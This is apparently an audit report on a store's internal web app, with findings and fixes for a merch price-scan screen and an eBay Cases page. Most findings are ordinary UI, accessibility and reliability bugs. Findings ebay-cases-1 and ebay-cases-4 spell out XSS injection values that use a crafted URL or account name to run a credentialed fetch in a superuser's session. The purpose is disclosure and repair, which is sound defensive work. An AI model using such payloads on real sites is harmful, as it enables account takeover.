**Evidence.** index.html:4839-4840: `.ps-link{font-size:12.5px;... background:none;border:none;cursor:pointer;padding:0}`. It styles the bar's mode switches Manual, Furniture and Buy (4966-4970) plus 'Change', the buy strip's 'Stop' and 'Set the ranges', giving a hit area about one line of 12.5 px text tall. `.ps-tab` (4713-4715) is 11px text with 6px padding, about 26 px. DESIGN.md §9 wants ≥40 px 'where realistic'. index.html:4750 `.ps-recent-row .ps-qty{...font-size:15px}` overrides the 16px that the comment at 4741-4743 insists on, so iOS Safari zooms on focusing the reprint quantity.

**Failure scenario.** A manager with a scanner in one hand tries to hit 'Manual' or 'Buy' in a wrapped bar at 393 px, misses, and hits 'Furniture' or nothing. In the Reprint tab on an iPhone, tapping a row's quantity zooms the page, and it has to be pinched back after every reprint.

**Proposed fix.** Add `#ps-bar .ps-link, .ps-ob-strip .ps-link, .ps-catrow .ps-link{min-height:44px;padding:0 8px;display:inline-flex;align-items:center}` and `.ps-tab{min-height:36px}`. Change 4750 to `font-size:16px;width:56px`. CSS only, about 4 lines; recheck the bar's wrap at 393 px.

<a id="merch-price-scan-17"></a>
#### merch-price-scan-17 — Missing JSON-parse guards turn edge 5xx HTML pages into 'Unexpected token <' with the status lost

*low · minor · bug · confidence high · `index.html:23676` · unverified*

**Evidence.** `const j = await r.json(); if (!r.ok) throw new Error(j.error || `HTTP ${r.status}`);` appears at index.html:23676 (psScan), 26798 (psPhoto), 24278 (fnOpen), 24315 (fnShot), 24346 (fnSave), 24366 (fnBandSave), 23828 (pmPrice) and 26244 (psOverrideSave). r.json() runs before r.ok, so a Cloudflare HTML error page (1101/1102 or 524 on a long cold lookup or vision call) throws a SyntaxError and the status is discarded. The sticker paths already use `.json().catch(() => ({}))` (e.g. 24971), and lessons.md 2026-09-02 rule 3 says to 'Never write a default message that discards the status code.'

**Failure scenario.** A cold merch-scan exceeds the worker's CPU limit, and the edge answers a 1102 HTML page. The screen says 'Could not price that: Unexpected token '<', "<!DOCTYPE "... is not valid JSON', which does not tell anyone whether to retry, sign in or redeploy.

**Proposed fix.** At each of those 8 sites: `const j = await r.json().catch(() => ({})); if (!r.ok) throw new Error(j.error || `HTTP ${r.status}`);`. For the two that then render j (psScan and psPhoto), also `if (!j || j.price === undefined && !j.title && !j.l3) throw new Error(`Empty answer (HTTP ${r.status})`)`. One line per site.

<a id="merch-price-scan-18"></a>
#### merch-price-scan-18 — A lookup still running when Manual or Furniture opens renders into the new mode

*low · minor · bug · confidence high · `index.html:23679` · unverified*

**Evidence.** pmOpen (23715-23723) and fnOpen (24265-24273) clear #ps-result and psChrome makes it visible for the mode (24255-24256). They do not cancel an in-flight psScan or psPhoto, or its psProgressStart timers. When the lookup answers, psScan still calls `psRender(j)` (23679), which writes the full scan card (hero price, Print button, override button) into #ps-result above the manual or furniture panel, and sets psLast to the scanned item. The progress schedule's timers also redraw the step list into the new mode until psProgressStop runs.

**Failure scenario.** The associate presses Look it up, realises it is a desk with no barcode, and taps Furniture. Seconds later a 'Unidentified item — $—' scan card with its own buttons appears above the furniture photo prompt. In Manual mode, 'Priced just before this' then refers to the scan, and the first Print on screen belongs to the wrong item.

**Proposed fix.** Add `let psGen = 0;`, increment it at the top of psChrome. In psScan and psPhoto capture `const gen = psGen;` before the fetch, and after it `if (gen !== psGen) { return; }` before psRender, leaving the finally to psProgressStop. About 6 lines.

<a id="merch-price-scan-19"></a>
#### merch-price-scan-19 — Missing labels, live region and keyboard access on scan controls

*low · minor · accessibility · confidence high · `index.html:4949` · unverified*

**Evidence.** #ps-status (index.html:4949) has no role/aria-live, yet it carries every validation and failure message ('That barcode does not check out…', 'Could not price that…'). #ps-input (4984) has only a placeholder. The .ps-fld `<label>`s in pmDraw (23773-23793), psOverride (26204-26213) and fnBandsHtml have no `for=`, even though the controls have ids (pm-l2, pm-l3, pm-retail, ps-e-l3…). The furniture photo prompt is a `<div class="fn-shot" onclick=...>` (24440-24442), which is neither focusable nor announced as a button.

**Failure scenario.** With VoiceOver, a rejected barcode produces no announcement, the scan box reads as 'text field', the manual-price selects read as unlabeled pop-ups, and 'Photograph the piece' cannot be reached by keyboard or switch control.

**Proposed fix.** `<div id="ps-status" role="status" aria-live="polite" …>`. Add `aria-label="Barcode or product name"` on #ps-input. Add `for="pm-l2"` etc. on the .ps-fld labels (ids already exist). Render .fn-shot as `<button type="button" class="fn-shot" …>`, adding `width:100%;font:inherit` to the .fn-shot rule. About 10 lines.

<a id="merch-price-scan-20"></a>
#### merch-price-scan-20 — Camera keeps running while the app is backgrounded, and the 30 s auto-stop cannot fire

*low · minor · performance · confidence medium · `index.html:26627` · unverified · fixed 2026-09-24*

**Evidence.** The only automatic release is the 30 s check inside the rAF loop (index.html:26627 `if (age > 30000) { psStopScan(); ... }`), plus navigateToPage (12002-12007). rAF is paused in hidden documents, so while the app is backgrounded the check never runs. grep finds no visibilitychange or pagehide handler in the file.

**Failure scenario.** On desktop Chrome, or anywhere the platform keeps capture alive for a background page, a manager opens Scan and switches to another tab or app. The camera and its indicator stay on for as long as the page is hidden. The 30 s safety only fires after they come back.

**Proposed fix.** Add once, next to psStopScan: `document.addEventListener('visibilitychange', () => { if (document.hidden && psScanning) psStopScan(); });`. 3 lines.

<a id="merch-price-scan-21"></a>
#### merch-price-scan-21 — Furniture 'priced before' date uses the UTC calendar day

*low · minor · bug · confidence high · `index.html:24454` · unverified*

**Evidence.** index.html:24454 `psEsc([c.store, (c.priced_at || '').slice(0, 10)]...)`. priced_at is written as `new Date().toISOString()` (worker.js:23020), so the slice is the UTC date. The rest of the app formats dates in ET with `Intl.DateTimeFormat('en-CA', { timeZone: 'America/New_York' })` (e.g. index.html:7603).

**Failure scenario.** A piece priced at BL16 at 8:30 pm ET on 2026-09-21 shows 'BL16 · 2026-09-22' on the match card, a day the store never priced it.

**Proposed fix.** Replace the slice with `(c.priced_at ? new Intl.DateTimeFormat('en-CA', { timeZone: 'America/New_York' }).format(new Date(c.priced_at)) : '')`. One line.

</details>

<a id="ebay-cases"></a>
### eBay Cases

The eBay Cases page is carefully reasoned and mostly sound. The worker splits the two lists, mode null renders as 'unknown', staleness reads last_successful_run_at, hours-left is recomputed from respond_by using epoch math, buyer comments are decoded and then escaped, and the read endpoint's storefront scoping is thorough. Biggest risk: escapeHtml does not escape quotes, and two attribute contexts carry text from the external Handler, the case link's href and the account chips' onclick. In a real browser I confirmed an injected onmouseover attribute on the link and a SyntaxError on an apostrophe in an account name, so the Handler token can inject script into superuser sessions. Second: the page only fetches on the first visit, so a revisit or a push tap re-renders a stale snapshot, without the alerted case and with a false red 'Handler has most likely stopped' banner. Every cold open also flashes 'Handler has never reported a successful run' while loading. Other real bugs: 'never notified' shows on cases the ledger has already pushed about; a stale account filter can show 0/$0; failed refreshes leave old header counts; the alert ledger stamps cases as notified even when no push was delivered; alert pushes ignore storefront scope. In light mode several urgency, pill and banner colours measure 2.5–4.2:1, and in dark mode the LIVE/SHADOW pill loses its colour. Two fixes need a planned worker change: per-recipient alert scoping, and batching the ingest's per-row D1 writes, which risk the ~1,000-subrequest cap on a resend. Most of the rest are small frontend-only fixes.

| ID | Sev | Size | Category | Finding | Where | Verified |
|---|---|---|---|---|---|---|
| [ebay-cases-1](#ebay-cases-1) | high | minor | security | Handler-supplied ebay_url is written into href with an escaper that leaves quotes alone, so attributes can be injected (XSS) | `index.html:31892` | unverified |
| [ebay-cases-2](#ebay-cases-2) | high | minor | bug | The page never refetches on revisit or push tap, and the staleness banner then blames Handler for the page's own stale data | `index.html:32110` | unverified |
| [ebay-cases-3](#ebay-cases-3) | medium | minor | ui-ux | Every first open flashes a red 'Handler has never reported a successful run' banner while the data loads | `index.html:31978` | unverified |
| [ebay-cases-4](#ebay-cases-4) | medium | minor | bug | Account chip onclick is built with escapeHtml inside a JS string, so an apostrophe breaks the filter and a crafted name runs script | `index.html:31961` | unverified |
| [ebay-cases-5](#ebay-cases-5) | medium | minor | bug | The Owner row says 'never notified' on cases the alert ledger has already pushed about | `index.html:31924` | unverified |
| [ebay-cases-6](#ebay-cases-6) | medium | minor | bug | If the selected account has no open cases left after a refresh, the page shows 0 / $0 with no chip selected | `index.html:32083` | unverified |
| [ebay-cases-7](#ebay-cases-7) | medium | minor | bug | A failed refresh discards good data but leaves the old header counts, totals, chips and 'Loaded' time on screen | `index.html:32087` | unverified |
| [ebay-cases-8](#ebay-cases-8) | medium | minor | accessibility | Light-mode urgency, pill and warning-banner colours fail 4.5:1 ('24h left', '2d left', 'No deadline', the stale warning) | `index.html:5715` | unverified |
| [ebay-cases-13](#ebay-cases-13) | medium | minor | bug | The alert ledger marks a case as notified even when no push was delivered, so that alert is never retried | `worker.js:9227` | unverified |
| [ebay-cases-12](#ebay-cases-12) | medium | major | security | Alert pushes ignore storefront (unit) scope, so a user limited to one account is pushed another account's cases and totals | `worker.js:9059` | unverified |
| [ebay-cases-14](#ebay-cases-14) | medium | major | performance | Ingest issues one D1 query per case and per audit line; a backlog or full-file resend can exceed the ~1,000-subrequest cap and loop forever | `worker.js:16384` | unverified |
| [ebay-cases-9](#ebay-cases-9) | low | minor | ui-ux | Refresh and the account chip collapse whichever case card is open, although the code comment says open state survives re-render | `index.html:32019` | unverified |
| [ebay-cases-10](#ebay-cases-10) | low | minor | ui-ux | In dark mode `.dark .eb-pill` beats every pill variant, so 'Live — auto-acting' renders grey | `index.html:5743` | unverified |
| [ebay-cases-11](#ebay-cases-11) | low | minor | accessibility | Account chips are clickable <span>s with no keyboard access or pressed state, and the chips (28px) and Refresh (34px) are small tap targets | `index.html:31960` | unverified |
| [ebay-cases-15](#ebay-cases-15) | low | minor | ui-ux | Cases with no deadline sort to the top of 'Needs action', above overdue ones | `worker.js:16705` | unverified |
| [ebay-cases-16](#ebay-cases-16) | low | minor | ui-ux | Hours-left labels round across the tier boundaries, so '6h left' shows red or amber and '24h left' amber or green | `index.html:31795` | unverified |
| [ebay-cases-17](#ebay-cases-17) | low | minor | ui-ux | Deadlines and timestamps use the device's timezone with no zone label; eBay's deadlines fall at about 3 AM ET | `index.html:31847` | unverified |
| [ebay-cases-18](#ebay-cases-18) | low | minor | ui-ux | Failed-action banner ignores the account filter and has no time bound; on a phone the Result column is off-screen | `index.html:31971` | unverified |
| [ebay-cases-19](#ebay-cases-19) | low | minor | ui-ux | The sticky header is 230px tall on a 393px phone, 27% of the screen | `index.html:5814` | unverified |
| [ebay-cases-20](#ebay-cases-20) | low | minor | ui-ux | Every row in 'With eBay' is painted red 'Nd past deadline', although the page says these cases cannot be resolved | `index.html:31787` | unverified |
| [ebay-cases-21](#ebay-cases-21) | low | minor | security | A staff user with an E-Commerce grant sees eBay Cases in the nav but gets 'HTTP 403', and still receives alert pushes that include dollar amounts | `index.html:11897` | unverified |
| [ebay-cases-22](#ebay-cases-22) | low | minor | performance | The read endpoint runs its three D1 queries one after another | `worker.js:16698` | unverified |

<details><summary>Details: evidence, failure scenario, proposed fix</summary>

<a id="ebay-cases-1"></a>
#### ebay-cases-1 — Handler-supplied ebay_url is written into href with an escaper that leaves quotes alone, so attributes can be injected (XSS)

*high · minor · security · confidence high · `index.html:31892` · unverified*

**Evidence.** index.html:31892-31895: `const href = c.ebay_url || (...)` then `<a href="${escapeHtml(href)}" target="_blank" ... onclick="event.stopPropagation()">`. escapeHtml (index.html:7753-7757) serialises a text node (`div.appendChild(document.createTextNode(String(str))); return div.innerHTML`), which escapes only & < > and never `"` or `'`. worker.js:16408 stores `str(c.ebayUrl)` exactly as sent, with no scheme or host check. I checked this in Chromium at 393px with a stubbed payload. With `ebay_url = 'https://www.ebay.com/itm/1" onmouseover="window.__pwn=1" x="'`, the rendered anchor's attributes were `href=https://www.ebay.com/itm/1`, `onmouseover=window.__pwn=1`, `x=`, target, rel, class, onclick. A `javascript:window.__js=1` value was also kept as the href unchanged.

**Failure scenario.** Anyone holding EBAY_HANDLER_TOKEN (Raj's external app, or whoever gets that token) can POST a case whose ebayUrl is `https://www.ebay.com/itm/1" onclick="fetch('/?action=...',{credentials:'include'})" x="`. The injected attribute comes before the page's own onclick, and the first duplicate attribute wins. So when a superuser expands the case and taps the case link, the injected script runs in the HUB origin with their session. worker.js:16330-16336 says the token's blast radius is 'exactly this handler'. This rendering path widens that to full account takeover of every E-Commerce user, superusers included.

**Proposed fix.** Frontend only. Add a validator and an attribute-safe escape:
```js
function ebSafeHref(u) {
  try { const x = new URL(String(u));
    return x.protocol === 'https:' && /(^|\.)ebay\.com$/i.test(x.hostname) ? x.href : ''; }
  catch (_) { return ''; }
}
const ebAttr = s => escapeHtml(s).replace(/"/g, '&quot;').replace(/'/g, '&#39;');
```
Then at 31892: `const href = ebSafeHref(c.ebay_url) || (c.item_id ? `https://www.ebay.com/itm/${encodeURIComponent(c.item_id)}` : '');` and at 31894: `href="${ebAttr(href)}"`. Handler's own link is still used verbatim when it is a real https eBay URL, so the comment about never constructing his scheme still holds. A non-eBay or unparseable URL falls back to the item link, then to the unlinked id.

<a id="ebay-cases-2"></a>
#### ebay-cases-2 — The page never refetches on revisit or push tap, and the staleness banner then blames Handler for the page's own stale data

*high · minor · bug · confidence high · `index.html:32110` · unverified*

**Evidence.** index.html:32109-32113: `function initEbayCases() { if (ebData) { ebRender(); return; } ebRender(); ebLoad(); }`. Only the first visit fetches. ebRender recomputes staleness from the cached response against the current clock: index.html:31978 `const st = ebStaleness(ebData && ebData.lastSuccessfulRunAt)` and index.html:31830 `const mins = (Date.now() - t) / 60000`. A push tap goes sw.js:95 `postMessage({type:'sw-navigate'})` → handleDeepLink (index.html:11607) → navigateToPage('ebay-cases') → the same cached path. Nothing on the page ticks while it stays open, and there is no visibilitychange handler anywhere in index.html. I checked this in the browser: after loading with lastSuccessfulRunAt 30 min old, I moved the clock forward 170 min and navigated Menu → eBay Cases. `__ebFetches` stayed at 1, and the alert rail read 'No successful Handler run for 3h. It polls every ~30 minutes, so it has most likely stopped — these cases are not being watched.' 'Loaded 11:16 PM' was unchanged and shows no date.

**Failure scenario.** Meredith opens eBay Cases at 9:00 and switches to Settings or Menu (the PWA stays alive). At 12:10 she gets the push 'New eBay case needs review' and taps it. The app focuses and routes to eBay Cases, which redraws the 9:00 snapshot. The new case is missing, closed cases are still listed, the KPIs are three hours old, and a red banner says Handler has 'most likely stopped' when it ran 5 minutes ago. The same happens if she leaves the page open: a case that read '45m left' still reads '45m left' an hour later, when it is actually past deadline.

**Proposed fix.** Frontend only, about 15 lines. (1) Refetch whenever the cached snapshot is older than a minute:
```js
function initEbayCases() {
  ebRender();
  if (!ebData || !ebFetchedAt || Date.now() - ebFetchedAt.getTime() > 60000) ebLoad();
}
```
(2) Add one `document.addEventListener('visibilitychange', ...)` that calls initEbayCases() when the tab becomes visible and #page-ebay-cases is not hidden. Optionally add a 60 s `setInterval(ebRender)` that runs only while the page is shown and is cleared on leave. That interval must keep open cards open (see ebay-cases-9). (3) While a refetch is in flight on stale data, suppress the Handler-staleness banner or word it as 'Refreshing…', and show a date in 'Loaded …' when it is not today.

<a id="ebay-cases-3"></a>
#### ebay-cases-3 — Every first open flashes a red 'Handler has never reported a successful run' banner while the data loads

*medium · minor · ui-ux · confidence high · `index.html:31978` · unverified*

**Evidence.** initEbayCases calls ebRender() before ebLoad() while ebData is still null (index.html:32111). ebRender then runs `const st = ebStaleness(ebData && ebData.lastSuccessfulRunAt)` (31978), which is ebStaleness(null) → `{ level: 'dead', msg: 'Handler has never reported a successful run. Nothing on this page is current.' }` (31823-31826), and the banner is pushed into #eb-alerts. The real loading indicator, `setHtml('eb-actionable', ebEmpty('Loading…'))` (32009), sits inside the 'Needs action' <details>, which is collapsed by default (5847). I checked this in the browser with a 1.5 s stubbed fetch: during the load, the only content on the page was the alert rail reading 'Handler has never reported a successful run. Nothing on this page is current.'

**Failure scenario.** Every cold open of the page, and every first visit after a failed load (ebData is reset to null at 32087), shows a red dead-man alarm for as long as the D1 round trip takes (often seconds on a phone). The reader is told Handler is dead until the data arrives. DESIGN.md §6 expects a skeleton or loading state, not a fault banner.

**Proposed fix.** At 31978: `const st = ebData ? ebStaleness(ebData.lastSuccessfulRunAt) : { level: 'ok' };`. Also show loading where it can be seen: when `!v`, fill #eb-kpis with four `.skel` tiles, or set `eb-updated` to 'Loading…', instead of relying on the collapsed section body.

<a id="ebay-cases-4"></a>
#### ebay-cases-4 — Account chip onclick is built with escapeHtml inside a JS string, so an apostrophe breaks the filter and a crafted name runs script

*medium · minor · bug · confidence high · `index.html:31961` · unverified*

**Evidence.** index.html:31961: `onclick="ebSetAccount('${escapeHtml(a)}')"`. escapeHtml leaves `'` and `"` alone (text-node serialisation). Account names come from Handler (worker.js:16398 `str(c.account) || parts[0]`). I checked this in the browser with accounts ["Bob's", 'shoes']: the chip's attribute was `ebSetAccount('Bob's')`, clicking it threw `SyntaxError: missing ) after argument list`, and 'All' stayed selected.

**Failure scenario.** If a storefront name contains an apostrophe ("Brian's Closet"), its chip does nothing and that account can never be filtered. A Handler-supplied account like `x');fetch('/?action=...',{credentials:'include'});('` runs arbitrary script when anyone taps the chip. That is the same trust-boundary break as ebay-cases-1.

**Proposed fix.** Pass the value through a data attribute instead of JS source:
```js
...accts.map(a => `<button type="button" class="eb-chip ${ebAccount === a ? 'eb-chip-on' : ''}" aria-pressed="${ebAccount === a}" data-acct="${escapeHtml(a).replace(/"/g,'&quot;')}" onclick="ebSetAccount(this.dataset.acct)">${escapeHtml(a)}</button>`)
```
This can land together with ebay-cases-11, which also turns the chips into buttons.

<a id="ebay-cases-5"></a>
#### ebay-cases-5 — The Owner row says 'never notified' on cases the alert ledger has already pushed about

*medium · minor · bug · confidence high · `index.html:31924` · unverified*

**Evidence.** index.html:31924-31926: `${dt('Owner', c.owner ? escapeHtml(c.owner) + (c.last_notified_at ? ` &middot; notified ...` : '') : '<span ...>Unassigned &middot; never notified</span>')}`. The notification time only shows when owner is set. owner is never set by anything: scripts/test-ebay-cases-page.mjs:229 says 'owner is still null — case assignment is not built'. runEbayAlerts does stamp `last_notified_at` and `notified_via='push'` (worker.js:9228-9232), and the endpoint returns both (worker.js:16702). I checked this in the browser: a case with last_notified_at two hours ago rendered 'Unassigned · never notified'.

**Failure scenario.** A NEEDS_HUMAN case triggers a push at 10:00 and the ledger records it. Someone opens the case, reads 'Unassigned · never notified', concludes the alert system missed it, and escalates by hand or pings Brian. The page contradicts the notification ledger the HUB owns.

**Proposed fix.** Split the row into two independent fields:
```js
${dt('Owner', c.owner ? escapeHtml(c.owner) : '<span class="text-opl-inkDimmer dark:text-op-inkDimmer">Unassigned</span>')}
${dt('Notified', c.last_notified_at
    ? escapeHtml(ebFmtWhen(c.last_notified_at)) + (c.notified_via ? ' &middot; ' + escapeHtml(c.notified_via) : '')
    : '<span class="text-opl-inkDimmer dark:text-op-inkDimmer">Never</span>')}
```

<a id="ebay-cases-6"></a>
#### ebay-cases-6 — If the selected account has no open cases left after a refresh, the page shows 0 / $0 with no chip selected

*medium · minor · bug · confidence high · `index.html:32083` · unverified*

**Evidence.** The chips are rebuilt from `ebData.accounts` (31958), and the worker derives that list from OPEN rows only: worker.js:16767 `accounts: [...new Set(rows.map(c => c.account))].sort()`. ebLoad success (32083) sets `ebData = d` but never checks that `ebAccount` is still in `d.accounts`. ebView keeps filtering on it: `rows.filter(c => c.account === ebAccount)` (31856).

**Failure scenario.** A user filters to 'fashion', works the last open fashion case in eBay, and taps Refresh. The fashion chip disappears and 'All' is not highlighted, because ebAccount is still 'fashion'. The KPIs read Needs action 0, At stake $0.00, Past deadline 0, and the list says 'Nothing needs action right now.' 'shoes' may have 12 overdue cases, and nothing on screen shows that a filter is active.

**Proposed fix.** In ebLoad, right after `ebData = d;`: `if (ebAccount && !(d.accounts || []).includes(ebAccount)) ebAccount = '';`. The alternative is to always render a chip for the active account even when it is absent from the list.

<a id="ebay-cases-7"></a>
#### ebay-cases-7 — A failed refresh discards good data but leaves the old header counts, totals, chips and 'Loaded' time on screen

*medium · minor · bug · confidence high · `index.html:32087` · unverified*

**Evidence.** The catch block at index.html:32086-32097 sets `ebData = null` and clears only #eb-actionable ('No data.'), #eb-appeals, #eb-actions and #eb-kpis. It does not reset #eb-actionable-count, #eb-actionable-amount, #eb-appeals-count, #eb-appeals-amount, #eb-actions-count, #eb-updated, #eb-mode or #eb-acct-chips, and ebRender is not called. Errors also read 'Could not load cases: HTTP 401/403' because `if (!r.ok) throw new Error(`HTTP ${r.status}`)` (32080) never reads the JSON `code`. Other pages map these codes, e.g. index.html:27463 `case 'NO_SESSION': return 'Your session has expired — sign in again.'`.

**Failure scenario.** The PWA is on flaky shop wi-fi and a Refresh times out. The section headers still read 'Needs action (12) · $1,234.00 at stake' and 'Loaded 9:02 AM', but the body says 'No data.' and the KPI tiles are gone. The last good snapshot, which was still useful, has been thrown away. An expired session shows 'HTTP 401' with no hint to sign in again.

**Proposed fix.** Frontend only. Keep the last good snapshot and surface the error on top of it. Hold the error in `let ebErr = ''`; in the catch set `ebErr = friendly(e)` and call ebRender() rather than nulling ebData. ebRender puts ebErr first in the alert rail. When `!ebData`, ebRender also clears the count and amount spans. Parse the body on !r.ok: `const j = await r.json().catch(() => ({})); throw new Error(j.code === 'NO_SESSION' ? 'Your session has expired — sign in again.' : j.code === 'NO_BUSINESS_ACCESS' ? 'Your account does not have E-Commerce access.' : (j.error || `HTTP ${r.status}`));`

<a id="ebay-cases-8"></a>
#### ebay-cases-8 — Light-mode urgency, pill and warning-banner colours fail 4.5:1 ('24h left', '2d left', 'No deadline', the stale warning)

*medium · minor · accessibility · confidence high · `index.html:5715` · unverified*

**Evidence.** index.html:5715-5717: `.eb-u-warn{color:#d97706}`, `.eb-u-ok{color:#16a34a}`, `.eb-u-none{color:#9ca3af}`. 5724-5725: `.eb-pill-shadow{color:#d97706}`, `.eb-pill-off{color:#9ca3af}`. 5747: `.eb-banner-warn{...color:#b45309}`. I computed these against the real grounds (opl-panel #ffffff; the banner's rgba(217,119,6,.08) composited over opl-bg #f4f3ee): eb-u-warn 3.19:1 (3.08 on the .eb-body tint), eb-u-ok 3.30:1, eb-u-none 2.54:1, eb-pill-shadow 3.19:1, eb-pill-off 2.54:1, eb-banner-warn 4.17:1. Every one of these is small text (.eb-due is 12px/600, pills are 10px, the banner is 14px). The dark values pass: #fbbf24 10.65, #4ade80 10.21, #9ca3af 7.01 on op-panel. eb-u-none and the pills need no dark or OLED change. `html:not(.dark) .eb-pill-unknown` (5727) was already fixed for exactly this 2.54:1, but its siblings were not. Note: #16a34a is the green-600 family that tasks/todo.md lists as 'left failing, Brian has not ruled'. The amber, grey and banner cases are not on that list.

**Failure scenario.** In light mode, which is the default for most daytime phone use, 'No deadline' renders at 2.54:1 and every '2d left' or '10h left' label sits at about 3.2:1. These are the labels the page says are 'the only colour that carries meaning'. The amber 'Last successful Handler run was 2h ago' warning banner is 4.17:1.

**Proposed fix.** Add light-only overrides beside the existing rules, using the same pattern as 5727:
```css
html:not(.dark) .eb-u-warn{color:#b45309}      /* 5.02 panel, 4.85 .eb-body */
html:not(.dark) .eb-u-ok{color:#15803d}        /* 5.02 / 4.85 */
html:not(.dark) .eb-u-none{color:#6b6453}      /* 5.88 */
html:not(.dark) .eb-pill-shadow{color:#b45309} /* 5.02 */
html:not(.dark) .eb-pill-off{color:#6b6453}    /* 5.88 */
html:not(.dark) .eb-banner-warn{color:#92400e} /* 5.89 on its tint */
```
The eb-u-ok change needs Brian's sign-off if the green family is considered brand.

<a id="ebay-cases-13"></a>
#### ebay-cases-13 — The alert ledger marks a case as notified even when no push was delivered, so that alert is never retried

*medium · minor · bug · confidence high · `worker.js:9227` · unverified*

**Evidence.** sendEbayAlert catches every per-subscription failure and returns `{ sent, recipients }` (worker.js:9093-9115). It returns `{ sent: 0 }` when there are no recipients (9081). runEbayAlerts discards that result (`await sendEbayAlert(env, {...})` at 9178, 9191, 9203) and then stamps every case: `for (const c of toAlert) UPDATE ebay_cases SET notified_tier = ?, last_notified_at = ?` (9227-9233). Its own comment (9224-9225) says 'Marking before sending would lose the alert entirely on a push failure', and marking after an all-failed send loses it the same way. test-ebay-alerts.mjs:180 notes that pushes fail with the harness's fake VAPID keys, yet line 90 still asserts the tier was recorded.

**Failure scenario.** VAPID keys are rotated, or every subscription for the ecom team has expired (410s are deleted and not counted). A case enters the auto-act window, no phone buzzes, and the ledger records `notified_tier='auto-act'`, so the case never qualifies again at that tier. The page (after ebay-cases-5) would even say 'Notified 21:04'. The bot then auto-resolves a case nobody was told about.

**Proposed fix.** Worker-only, about 10 lines: `const rAA = aa.length ? await sendEbayAlert(...) : null;` and likewise for nh. Build `const delivered = new Set(); if (rAA && rAA.sent) delivered.add('auto-act'); if (rNH && rNH.sent) delivered.add('needs-human');` and stamp only `toAlert.filter(c => delivered.has(c.tier))`. In test-ebay-alerts.mjs, stub sendWebPush to succeed for the ledger assertions, and add a case asserting that an all-failed send leaves notified_tier NULL. A retry every ingest is harmless when nothing can be delivered.

<a id="ebay-cases-12"></a>
#### ebay-cases-12 — Alert pushes ignore storefront (unit) scope, so a user limited to one account is pushed another account's cases and totals

*medium · major · security · confidence high · `worker.js:9059` · unverified*

**Evidence.** worker.js:9059-9068 ebayAlertRecipients selects `u.role = 'superuser' OR g.user_id IS NOT NULL` from `user_grants g ... AND g.business_id = 'ecom'`. It never reads `g.units`. Bodies name the account, case and amount (9181 `${f.account} · ${f.case_type} #${f.case_id} · ${money(f.amount)}`; 9194, 9206) or sum across every account (9195, 9207). Compare the read endpoint, which scopes rows, recent actions AND account_status by allowedUnits (worker.js:16671-16691, 16733-16760), with a comment calling the unscoped account_status a leak: 'a manager scoped to shoes still learned that fashion exists'. test-ebay-alerts.mjs covers business-level exclusion (u-mgr1) but has no unit-scoped recipient.

**Failure scenario.** A contractor is given an ecom grant with units ['shoes']. A 'fashion' case goes NEEDS_HUMAN, and they get the push 'New eBay case needs review — fashion · RETURN #123 · $54.99'. Tapping it opens a page that, correctly, does not show that case. The storefront name, case ids and dollar totals the read path withholds are delivered by push.

**Plan.** FUTURE PLAN (worker-only, no API or schema change):
1. Have ebayAlertRecipients return `u.role` and `g.units`, and derive each recipient's scope with the same rule as allowedUnits(user,'ecom'): superuser or admin → null (all), grant units NULL → all, otherwise the parsed list, and fail closed on unparseable JSON.
2. Group recipients by scope key. For each group, filter `failed`, `aa` and `nh` to accounts in scope, build that group's title and body from the filtered lists, and send only to that group's subscriptions (sendEbayAlert takes a recipient list rather than querying).
3. Stamp the ledger per case only when at least one in-scope recipient received it (combine with ebay-cases-13).
4. Deploy order: worker only. Nothing on the client changes, and the response shape of ingest is unchanged.
5. Verify: add a unit-scoped user to test-ebay-alerts.mjs (ecom units ['shoes']) plus a 'fashion' case, and assert there is no notification_log row for them and that a 'shoes' case still reaches them. Then do a staging ingest per tasks/ebay-case-handler.md before prod. Risk: more push batches (one per scope group). Keep the 3-trigger cap per group.

<a id="ebay-cases-14"></a>
#### ebay-cases-14 — Ingest issues one D1 query per case and per audit line; a backlog or full-file resend can exceed the ~1,000-subrequest cap and loop forever

*medium · major · performance · confidence medium · `worker.js:16384` · unverified*

**Evidence.** worker.js:16384-16417 runs `for (const [key, c] of Object.entries(cases)) { await env.DB.prepare(`INSERT ... ON CONFLICT ...`).bind(...).run(); }`. Every run sends the full snapshot, closed cases included, and that list only grows (194 cases on 2026-08-04, 153 of them closed). worker.js:16496-16520 does the same for each audit line (`for (const line of audit) { ... await env.DB.prepare(`INSERT OR IGNORE ...`).run(); }`). The comments state that Handler 're-sends on any non-200 and re-sends the whole file if it is rotated or truncated'. The audit file already had 779 lines on 2026-08-04 (tasks/ebay-case-handler.md:124). This repo treats ~1,000 subrequests per invocation as a hard ceiling elsewhere (worker.js:45, 3343, 12058 'one batch of several thousand statements is a way to discover a subrequest limit in production') and batches with env.DB.batch there. runEbayAlerts adds one UPDATE per alerted case (9228).

**Failure scenario.** A worker deploy breaks ingest for a few hours, or Raj's log rotates and he resends the whole audit file. The next POST carries about 200 cases plus 800 or more audit lines, over 1,000 D1 calls, and fails. That returns a 500, so Handler resends the same growing payload every 30 minutes and never recovers. The page then falls to the 'most likely stopped' banner while Handler is healthy. Even without a failure, each run spends about 200 sequential D1 round trips.

**Plan.** FUTURE PLAN (worker-only, response contract unchanged):
1. Prepare the case upsert once and send the binds through `env.DB.batch` in chunks of about 50. Compute the line hashes up front (`await Promise.all(audit.map(l => sha256Hex(JSON.stringify(l))))`), then batch the INSERT OR IGNORE statements in chunks. Batch the ledger UPDATEs in runEbayAlerts as well.
2. Keep everything else as it is: the `now` stamp logic, the COUNT-delta event count, sinceActionId, and the stale sweep (still per account, still count-then-update).
3. Deploy: worker only; the client and Handler are unaffected. D1 batches are transactional per chunk, and both writes are idempotent (upsert / INSERT OR IGNORE), so a mid-way failure plus Handler's resend converges.
4. Verify: extend test-ebay-ingest.mjs with 600 cases and 2,000 audit lines and a prepare/run counter, assert under ~40 D1 calls and identical row contents versus the loop version, and run test-ebay-stale-close and test-ebay-alerts. Then do a staging POST from Raj before prod, per tasks/ebay-case-handler.md, and confirm the rollout landed per CLAUDE.md rule 5.
Risk: the batch-size limit and CPU time on very large payloads. Cap the chunk size and consider asking Raj to stop sending cases that have been closed for more than N days.

<a id="ebay-cases-9"></a>
#### ebay-cases-9 — Refresh and the account chip collapse whichever case card is open, although the code comment says open state survives re-render

*low · minor · ui-ux · confidence high · `index.html:32019` · unverified*

**Evidence.** index.html:31874-31875 says: 'Native <details> ... survives re-render without us tracking open state.' That holds for the three static section <details>. The case cards, though, are rebuilt on every render: `setHtml('eb-actionable', v.actionable.map(c => ebCaseRow(c, 'actionable')).join(''))` (32019-32020). I checked this in the browser: I opened the first card, awaited ebLoad(), and `.eb-case.open` was false.

